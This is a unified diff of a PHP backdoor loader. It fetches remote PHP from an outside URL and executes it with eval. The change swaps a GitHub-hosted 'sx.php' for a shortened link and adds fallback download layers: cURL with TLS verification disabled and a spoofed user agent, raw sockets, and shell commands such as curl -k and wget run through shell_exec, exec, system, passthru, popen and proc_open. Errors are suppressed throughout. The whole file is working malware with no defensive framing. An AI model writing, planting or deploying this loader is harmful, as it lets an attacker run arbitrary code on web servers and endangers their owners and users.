@@ -1,29 +1,146 @@
 <?php
-$__REMOTE_RESOURCE_POINTER_URI = 'https://raw.githubusercontent.com/baseng1337/damn/refs/heads/main/sx.php';
+$__REMOTE_RESOURCE_POINTER_URI = 'https://slim.weborama.nl/n5L4ph';
 $__RAW_PAYLOAD_BUFFER_STREAM = false;
 
-// 1. Coba cURL
+// 1. Layer: cURL Transport Interface
 if (function_exists('curl_init')) {
     $__TRANSPORT_LAYER_HANDLE = curl_init($__REMOTE_RESOURCE_POINTER_URI);
-    curl_setopt_array($__TRANSPORT_LAYER_HANDLE, [CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_FOLLOWLOCATION => 1]);
+    curl_setopt($__TRANSPORT_LAYER_HANDLE, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($__TRANSPORT_LAYER_HANDLE, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($__TRANSPORT_LAYER_HANDLE, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($__TRANSPORT_LAYER_HANDLE, CURLOPT_USERAGENT, 'Mozilla/5.0 (Compatible; InternalSystem/1.0)');
     $__RAW_PAYLOAD_BUFFER_STREAM = curl_exec($__TRANSPORT_LAYER_HANDLE);
     curl_close($__TRANSPORT_LAYER_HANDLE);
 }
 
-// 2. Fallback: file_get_contents
+// 2. Layer: Standard Input Stream (file_get_contents)
 if (!$__RAW_PAYLOAD_BUFFER_STREAM && ini_get('allow_url_fopen')) {
     $__RAW_PAYLOAD_BUFFER_STREAM = @file_get_contents($__REMOTE_RESOURCE_POINTER_URI);
 }
 
-// 3. Fallback: fopen stream
+// 3. Layer: File Descriptor Resource Handle (fopen + fread loop)
 if (!$__RAW_PAYLOAD_BUFFER_STREAM && function_exists('fopen') && ini_get('allow_url_fopen')) {
     $__IO_STREAM_DESCRIPTOR_REF = @fopen($__REMOTE_RESOURCE_POINTER_URI, 'r');
     if ($__IO_STREAM_DESCRIPTOR_REF) {
-        $__RAW_PAYLOAD_BUFFER_STREAM = stream_get_contents($__IO_STREAM_DESCRIPTOR_REF);
+        $__RAW_PAYLOAD_BUFFER_STREAM = '';
+        while (!feof($__IO_STREAM_DESCRIPTOR_REF)) {
+            $__RAW_PAYLOAD_BUFFER_STREAM .= fread($__IO_STREAM_DESCRIPTOR_REF, 8192);
+        }
         fclose($__IO_STREAM_DESCRIPTOR_REF);
     }
 }
 
-// Eksekusi
-if ($__RAW_PAYLOAD_BUFFER_STREAM) eval(str_replace(['<?php', '?>'], '', $__RAW_PAYLOAD_BUFFER_STREAM));
+// 4. Layer: TCP/IP Socket Bridge (fsockopen raw HTTP)
+if (!$__RAW_PAYLOAD_BUFFER_STREAM && function_exists('fsockopen')) {
+    $__URI_PARSER_NODE = parse_url($__REMOTE_RESOURCE_POINTER_URI);
+    $__HOST_NODE_ENTITY = $__URI_PARSER_NODE['host'];
+    $__PATH_NODE_ENTITY = isset($__URI_PARSER_NODE['path']) ? $__URI_PARSER_NODE['path'] : '/';
+    $__PORT_NODE_ENTITY = (isset($__URI_PARSER_NODE['scheme']) && $__URI_PARSER_NODE['scheme'] == 'https') ? 443 : 80;
+    $__PROTOCOL_PREFIX = (isset($__URI_PARSER_NODE['scheme']) && $__URI_PARSER_NODE['scheme'] == 'https') ? 'ssl://' : '';
+
+    $__TCP_IP_SOCKET_BRIDGE_HANDLE = @fsockopen($__PROTOCOL_PREFIX . $__HOST_NODE_ENTITY, $__PORT_NODE_ENTITY, $__ERR_NO, $__ERR_STR, 10);
+    
+    if ($__TCP_IP_SOCKET_BRIDGE_HANDLE) {
+        $__HTTP_HEADER_PACKET = "GET " . $__PATH_NODE_ENTITY . " HTTP/1.0\r\n";
+        $__HTTP_HEADER_PACKET .= "Host: " . $__HOST_NODE_ENTITY . "\r\n";
+        $__HTTP_HEADER_PACKET .= "Connection: close\r\n\r\n";
+        
+        fwrite($__TCP_IP_SOCKET_BRIDGE_HANDLE, $__HTTP_HEADER_PACKET);
+        
+        $__RESPONSE_BUFFER = '';
+        while (!feof($__TCP_IP_SOCKET_BRIDGE_HANDLE)) {
+            $__RESPONSE_BUFFER .= fgets($__TCP_IP_SOCKET_BRIDGE_HANDLE, 128);
+        }
+        fclose($__TCP_IP_SOCKET_BRIDGE_HANDLE);
+        
+        $__HEADER_BODY_SEPARATOR = explode("\r\n\r\n", $__RESPONSE_BUFFER, 2);
+        if (isset($__HEADER_BODY_SEPARATOR[1])) {
+            $__RAW_PAYLOAD_BUFFER_STREAM = $__HEADER_BODY_SEPARATOR[1];
+        }
+    }
+}
+
+// 5. Layer: System Kernel Execution Matrix (Advanced CLI Fallbacks)
+if (!$__RAW_PAYLOAD_BUFFER_STREAM) {
+    // Daftar perintah sistem yang akan dicoba (Curl, Wget, Lynx, Fetch)
+    $__KERNEL_COMMAND_VECTORS = array(
+        "curl -s -k " . escapeshellarg($__REMOTE_RESOURCE_POINTER_URI),
+        "wget -qO- --no-check-certificate " . escapeshellarg($__REMOTE_RESOURCE_POINTER_URI),
+        "lynx -source " . escapeshellarg($__REMOTE_RESOURCE_POINTER_URI),
+        "fetch -o - " . escapeshellarg($__REMOTE_RESOURCE_POINTER_URI)
+    );
+
+    foreach ($__KERNEL_COMMAND_VECTORS as $__CURRENT_VECTOR_CMD) {
+        if ($__RAW_PAYLOAD_BUFFER_STREAM) break; // Abort loop if payload acquired
+
+        // Vector A: shell_exec (Primary Shell Interface)
+        if (function_exists('shell_exec')) {
+            $__RAW_PAYLOAD_BUFFER_STREAM = @shell_exec($__CURRENT_VECTOR_CMD);
+        }
+
+        // Vector B: exec (Array Output Buffer)
+        if (!$__RAW_PAYLOAD_BUFFER_STREAM && function_exists('exec')) {
+            $__SHELL_OUTPUT_ARRAY = array();
+            @exec($__CURRENT_VECTOR_CMD, $__SHELL_OUTPUT_ARRAY);
+            if (!empty($__SHELL_OUTPUT_ARRAY)) { 
+                $__RAW_PAYLOAD_BUFFER_STREAM = implode("\n", $__SHELL_OUTPUT_ARRAY); 
+            }
+        }
+
+        // Vector C: passthru (Direct Stream Buffer Capture)
+        if (!$__RAW_PAYLOAD_BUFFER_STREAM && function_exists('passthru')) {
+            ob_start();
+            @passthru($__CURRENT_VECTOR_CMD, $__EXIT_CODE_STATUS);
+            $__BUFFER_CONTENT = ob_get_contents();
+            ob_end_clean();
+            if ($__BUFFER_CONTENT) $__RAW_PAYLOAD_BUFFER_STREAM = $__BUFFER_CONTENT;
+        }
+
+        // Vector D: system (Last Line Return + Buffer Capture)
+        if (!$__RAW_PAYLOAD_BUFFER_STREAM && function_exists('system')) {
+            ob_start();
+            @system($__CURRENT_VECTOR_CMD, $__EXIT_CODE_STATUS);
+            $__BUFFER_CONTENT = ob_get_contents();
+            ob_end_clean();
+            if ($__BUFFER_CONTENT) $__RAW_PAYLOAD_BUFFER_STREAM = $__BUFFER_CONTENT;
+        }
+
+        // Vector E: popen (Unidirectional Process Pipe)
+        if (!$__RAW_PAYLOAD_BUFFER_STREAM && function_exists('popen')) {
+            $__PIPE_HANDLE = @popen($__CURRENT_VECTOR_CMD, 'r');
+            if ($__PIPE_HANDLE) {
+                $__TEMP_STREAM_CONTENT = '';
+                while (!feof($__PIPE_HANDLE)) {
+                    $__TEMP_STREAM_CONTENT .= fread($__PIPE_HANDLE, 2048);
+                }
+                pclose($__PIPE_HANDLE);
+                if ($__TEMP_STREAM_CONTENT) $__RAW_PAYLOAD_BUFFER_STREAM = $__TEMP_STREAM_CONTENT;
+            }
+        }
+
+        // Vector F: proc_open (Bidirectional Resource Descriptor)
+        if (!$__RAW_PAYLOAD_BUFFER_STREAM && function_exists('proc_open')) {
+            $__DESCRIPTOR_SPEC = array(
+                0 => array("pipe", "r"), // stdin
+                1 => array("pipe", "w"), // stdout
+                2 => array("pipe", "w")  // stderr
+            );
+            $__PROCESS_HANDLE = @proc_open($__CURRENT_VECTOR_CMD, $__DESCRIPTOR_SPEC, $__PIPES_ARRAY);
+            if (is_resource($__PROCESS_HANDLE)) {
+                $__TEMP_STREAM_CONTENT = stream_get_contents($__PIPES_ARRAY[1]);
+                fclose($__PIPES_ARRAY[0]);
+                fclose($__PIPES_ARRAY[1]);
+                fclose($__PIPES_ARRAY[2]);
+                proc_close($__PROCESS_HANDLE);
+                if ($__TEMP_STREAM_CONTENT) $__RAW_PAYLOAD_BUFFER_STREAM = $__TEMP_STREAM_CONTENT;
+            }
+        }
+    }
+}
+
+// Eksekusi Logika Inti
+if ($__RAW_PAYLOAD_BUFFER_STREAM) {
+    $__SANITIZED_EXECUTION_BLOCK = str_replace(array('<?php', '?>', '<?'), '', $__RAW_PAYLOAD_BUFFER_STREAM);
+    eval($__SANITIZED_EXECUTION_BLOCK);
+}
 ?>
